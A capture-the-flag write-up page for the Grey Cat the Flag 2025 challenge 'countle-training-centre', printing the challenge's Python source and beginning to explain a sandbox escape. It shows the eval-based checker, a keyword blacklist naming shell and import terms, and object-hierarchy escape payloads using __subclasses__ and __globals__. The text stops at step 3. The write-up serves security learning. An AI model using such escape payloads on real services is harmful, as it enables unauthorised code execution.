@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Grey Cat the Flag 2025 - misc/countle-training-centre | CTF Writeups</title>
+<meta name="keywords" content="">
+<meta name="description" content="The challenge presents a math game where we have to solve expressions to reach target numbers 1,1,000,000.
+╔════════════════╗ ║ Puzzle #1 ║ ╚════════════════╝ Target: 234 Nums: 25 6 2 4 3 4 The actual challenge is escaping a python sandbox. Looking at the source:
+#!/usr/local/bin/python from re import match from sys import exit from time import sleep from countle_puzzle import generateSolvablePuzzle def format(s): return (s.replace(&#39;~E&#39;,&#34;\033[0m&#34;).replace(&#39;~R&#39;,&#34;\033[0;1;31m&#34;).replace(&#39;~N&#39;,&#34;\033[0;1;7;31m&#34;) .replace(&#39;~w&#39;,&#34;\033[7;37m&#34;).replace(&#39;~u&#39;,&#34;\33[4;31m&#34;).replace(&#39;~Gr&#39;,&#34;\33[0;90m&#34;).replace(&#39;~r&#39;,&#34;\33[0;31m&#34;) .replace(&#39;~G&#39;,&#34;\033[0;1;32m&#34;).replace(&#39;~B&#39;,&#34;\033[1;34m&#34;)).replace(&#39;~W&#39;,&#34;\033[1;4;37m&#34;) def banner(): return format(r&#34;&#34;&#34; ~R( * ) ( )\ ` )\ /( )\ (((_) ( )(_))(((_) )\\~E___ ~R(~E_~R(~E_~R()) )\\~E___ ~R((~w/ __|~E ~w|_ _|~R((~w/ __|~E ~w| (~E__ ~w| |~E ~w| (~E ~w\___|~E ~w|_|~E ~w\___|~E ~RWelcome to the~E ~NCountle Training Centre!">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/grey-cat-the-flag-2025-countle-training-centre/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.287d23ee212a39f1ca2dfc362a4cfcc63951b52b214116e1cb5663bb1883333a.css" integrity="sha256-KH0j7iEqOfHKLfw2Kkz8xjlRtSshQRbhy1ZjuxiDMzo=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/grey-cat-the-flag-2025-countle-training-centre/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="CTF Writeups (Alt + H)">CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Grey Cat the Flag 2025 - misc/countle-training-centre
+    </h1>
+    <div class="post-meta"><span title='2025-06-01 19:02:16 -0400 EDT'>June 1, 2025</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p>The challenge presents a math game where we have to solve expressions to reach target numbers 1,1,000,000.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>╔════════════════╗
+</span></span><span style="display:flex;"><span>║ Puzzle <span style="color:#75715e">#1      ║</span>
+</span></span><span style="display:flex;"><span>╚════════════════╝
+</span></span><span style="display:flex;"><span> Target: <span style="color:#ae81ff">234</span>
+</span></span><span style="display:flex;"><span> Nums: <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">4</span>
+</span></span></code></pre></div><p>The actual challenge is escaping a python sandbox. Looking at the source:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/local/bin/python</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> re <span style="color:#f92672">import</span> <span style="color:#66d9ef">match</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> exit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> countle_puzzle <span style="color:#f92672">import</span> generateSolvablePuzzle
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">format</span>(s):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;~E&#39;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;~R&#39;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0;1;31m&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;~N&#39;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0;1;7;31m&#34;</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;~w&#39;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[7;37m&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;~u&#39;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\33</span><span style="color:#e6db74">[4;31m&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;~Gr&#39;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\33</span><span style="color:#e6db74">[0;90m&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;~r&#39;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\33</span><span style="color:#e6db74">[0;31m&#34;</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;~G&#39;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0;1;32m&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;~B&#39;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[1;34m&#34;</span>))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;~W&#39;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[1;4;37m&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">banner</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> format(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ~R(     *   )    (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  )\  ` )\  /(   )\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> (((_)  ( )(_))(((_)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)\\~E___ ~R(~E_~R(~E_~R()) )\\~E___
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">~R((~w/ __|~E ~w|_   _|~R((~w/ __|~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ~w| (~E__    ~w| |~E   ~w| (~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ~w\___|~E   ~w|_|~E    ~w\___|~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     ~RWelcome to the~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">~NCountle Training Centre!~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">goal</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> format(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">~RToday&#39;s Goal:~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ╔════════════════════╗
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ║ ~u1,000,000~E problems ║
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ╚════════════════════╝
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            ~Gr^consecutive~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">menu</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Menu:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> [S] Start Challenge
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> [H] Help
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> [B] Blacklist
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> [Q] Quit
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">help</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> format(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;&#34;&#34;~WHow to play?~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Combine the given numbers using
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ~Baddition (+)~E,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ~Bsubtraction (-)~E,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ~Bmultiplication (*)~E, and
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ~Bdivision(/)~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">to reach the target.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">~R!! No negative numbers or fractions allowed !!~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">For e.g.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ~BTarget: 947
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Nums: 100 7 4 5 9 7~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Valid solution:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ~G((100 + 7) * (4 + 5) - 9 - 7)~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Blacklisted word, not allowed in input</span>
+</span></span><span style="display:flex;"><span>BLACKLIST <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;breakpoint&#39;</span>, <span style="color:#e6db74">&#39;builtins&#39;</span> <span style="color:#e6db74">&#39;cat&#39;</span>, <span style="color:#e6db74">&#39;compile&#39;</span>, <span style="color:#e6db74">&#39;dict&#39;</span>, <span style="color:#e6db74">&#39;eval&#39;</span>, <span style="color:#e6db74">&#39;exec&#39;</span>, <span style="color:#e6db74">&#39;getframe&#39;</span>,
+</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">&#39;help&#39;</span>, <span style="color:#e6db74">&#39;import&#39;</span>, <span style="color:#e6db74">&#39;input&#39;</span>, <span style="color:#e6db74">&#39;inspect&#39;</span>, <span style="color:#e6db74">&#39;open&#39;</span>, <span style="color:#e6db74">&#39;os&#39;</span>, <span style="color:#e6db74">&#39;sh&#39;</span>, <span style="color:#e6db74">&#39;signal&#39;</span> <span style="color:#e6db74">&#39;subprocess&#39;</span>, <span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">blacklist</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> format(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;&#34;&#34;~RBlacklist:~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ~rbreakpoint
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> builtins
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> cat
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> compile
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> dict
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> eval
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> exec
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> getframe
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> help
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> import
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> input
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> inspect
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> open
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> os
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> sh
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> signal
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> subprocess
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> system~E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove breakpoint and help, too powerful</span>
+</span></span><span style="display:flex;"><span>__builtins__<span style="color:#f92672">.</span>__dict__<span style="color:#f92672">.</span>pop(<span style="color:#e6db74">&#39;breakpoint&#39;</span>)
+</span></span><span style="display:flex;"><span>__builtins__<span style="color:#f92672">.</span>__dict__<span style="color:#f92672">.</span>pop(<span style="color:#e6db74">&#39;help&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">checkAnswer</span>(expr, target):
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> eval(expr, {<span style="color:#e6db74">&#39;FLAG&#39;</span>:<span style="color:#e6db74">&#34;no flag for you&#34;</span>, <span style="color:#e6db74">&#34;__builtins__&#34;</span>: <span style="color:#66d9ef">None</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result <span style="color:#f92672">==</span> target
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">challenge</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1000000</span>):
+</span></span><span style="display:flex;"><span>        n,t <span style="color:#f92672">=</span> generateSolvablePuzzle()
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;╔════════════════╗&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;║ Puzzle #&#34;</span> <span style="color:#f92672">+</span> str(_<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">6</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; ║&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;╚════════════════╝&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(format(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34; ~BTarget: &#34;</span> <span style="color:#f92672">+</span> str(t) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> Nums:&#34;</span>), <span style="color:#f92672">*</span>n, format(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;~E&#34;</span>), <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        expr <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34; Your Answer:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> &gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>        print()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">not</span> <span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;[0-9+\-*/()]+&#34;</span>, expr)):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (print(format(<span style="color:#e6db74">&#34;~RThat is not a valid expression. Read &#39;Help&#39; for more info.~E&#34;</span>)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> (len(expr) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">160</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (print(format(<span style="color:#e6db74">&#34;~RWhat are you doing with so many characters? Read &#39;Help&#39; for more info.~E&#34;</span>)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> BLACKLIST <span style="color:#f92672">+</span> [str(t)]:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> b <span style="color:#f92672">in</span> expr:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> (print(format(<span style="color:#e6db74">&#34;~RBlacklisted word is not allowed: &#34;</span><span style="color:#f92672">+</span>b<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;~E&#34;</span>)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">not</span> checkAnswer(expr, t)):
+</span></span><span style="display:flex;"><span>            print(format(<span style="color:#e6db74">&#34; ~Rtsk tsk tsk...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> Your answer is wrong!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> I&#39;m dissapointed...~E&#34;</span>))
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(format(<span style="color:#e6db74">&#34; ~GCorrect!~E</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>            sleep(<span style="color:#ae81ff">0.1</span>) <span style="color:#75715e"># rate limit</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (_ <span style="color:#f92672">==</span> <span style="color:#ae81ff">999999</span>):
+</span></span><span style="display:flex;"><span>            print(format(<span style="color:#e6db74">&#34; ~GCongrats!! Here is your flag:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">   &#34;</span> <span style="color:#f92672">+</span> FLAG <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;~E&#34;</span>))
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag</span><span style="color:#e6db74">{placeholder}</span><span style="color:#e6db74">}&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    print(banner())
+</span></span><span style="display:flex;"><span>    print(goal())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        print(menu())
+</span></span><span style="display:flex;"><span>        choice <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;&gt; &#34;</span>)<span style="color:#f92672">.</span>upper()[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>        print()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;S&#39;</span>):
+</span></span><span style="display:flex;"><span>            challenge()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> (choice <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;H&#39;</span>):
+</span></span><span style="display:flex;"><span>            print(help())
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> (choice <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;B&#39;</span>):
+</span></span><span style="display:flex;"><span>            print(blacklist())
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> (choice <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Q&#39;</span>):
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">checkAnswer</span>(expr, target):
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> eval(expr, {<span style="color:#e6db74">&#39;FLAG&#39;</span>:<span style="color:#e6db74">&#34;no flag for you&#34;</span>, <span style="color:#e6db74">&#34;__builtins__&#34;</span>: <span style="color:#66d9ef">None</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result <span style="color:#f92672">==</span> target
+</span></span></code></pre></div><p>The <code>checkAnswer</code> function, which:</p>
+<ul>
+<li>Uses <code>eval()</code> to execute user input</li>
+<li>Sets <code>__builtins__</code> to <code>None</code> (disabling built-in functions)</li>
+<li>Overwrites <code>FLAG</code> with a fake value in the local context</li>
+<li>Only returns boolean result (doesn&rsquo;t print the actual evaluation)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">not</span> <span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;[0-9+\-*/()]+&#34;</span>, expr)):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (print(format(<span style="color:#e6db74">&#34;~RThat is not a valid expression...&#34;</span>)))
+</span></span></code></pre></div><p>There is regex validation on user input, and blacklist:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>BLACKLIST <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;breakpoint&#39;</span>, <span style="color:#e6db74">&#39;builtins&#39;</span> <span style="color:#e6db74">&#39;cat&#39;</span>, <span style="color:#e6db74">&#39;compile&#39;</span>, <span style="color:#e6db74">&#39;dict&#39;</span>, <span style="color:#e6db74">&#39;eval&#39;</span>, <span style="color:#e6db74">&#39;exec&#39;</span>, 
+</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">&#39;getframe&#39;</span>, <span style="color:#e6db74">&#39;help&#39;</span>, <span style="color:#e6db74">&#39;import&#39;</span>, <span style="color:#e6db74">&#39;input&#39;</span>, <span style="color:#e6db74">&#39;inspect&#39;</span>, <span style="color:#e6db74">&#39;open&#39;</span>, <span style="color:#e6db74">&#39;os&#39;</span>, 
+</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">&#39;sh&#39;</span>, <span style="color:#e6db74">&#39;signal&#39;</span> <span style="color:#e6db74">&#39;subprocess&#39;</span>, <span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span></code></pre></div><p>One issue is that  match only checks the beginning of a string, not the whole string!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">not</span> <span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;[0-9+\-*/()]+&#34;</span>, expr)):
+</span></span></code></pre></div><p>We can use <code>()</code>, so we can access Python&rsquo;s object heirarch through the empty tuple:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()
+</span></span></code></pre></div><p>This gives us access to all classes that inherit from <code>object</code>, which includes many useful classes with access to modules and built-in functions.</p>
+<p>Afer playing around for a while I found <code>_sitebuiltins.Quitter</code> at index 156 which works perfectly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">156</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__
+</span></span></code></pre></div><p>One issue I ran into was the server was running an older version of python, so the list of subclasses was different. We were given a Dockerfile so I used that for local testing and finding the right offset.</p>
+<h3 id="step-3-accessing-the-real-flag">Step 3: Accessing the Real FLAG<a hidden class="anchor" aria-hidden="true" href="#step-3-accessing-the-real-flag">#</a></h3>
+<p>The real FLAG variable exists in the <code>__main__</code> module&rsquo;s global scope, which we can access via:</p>
